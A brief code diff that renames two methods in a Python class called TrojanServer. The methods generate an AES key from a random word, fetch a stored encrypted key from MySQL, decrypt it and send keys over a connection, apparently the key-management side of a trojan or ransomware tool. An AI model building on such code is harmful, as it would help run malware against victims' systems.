@@ -51,7 +51,7 @@ class  TrojanServer:
         hasher.update(secret_word.encode())
         return hasher.digest()
     
-    def Generate_Aes_Key(self, conn):
+    def GENERATE_AES_KEY(self, conn):
         from random_word import RandomWords
         r = RandomWords()
         random_word = r.get_random_word()
@@ -61,7 +61,7 @@ class  TrojanServer:
         protocol.send(conn, aes_key)
         return aes_key
     
-    def _handle_decrypt(self, conn):
+    def GET_AES_KEY(self, conn):
         encrypted_key = self.mysql_retrieve_last_key()
         aes_key = self.decrypt_RSA_from_AES_key(encrypted_key)
         protocol.send(conn, aes_key)
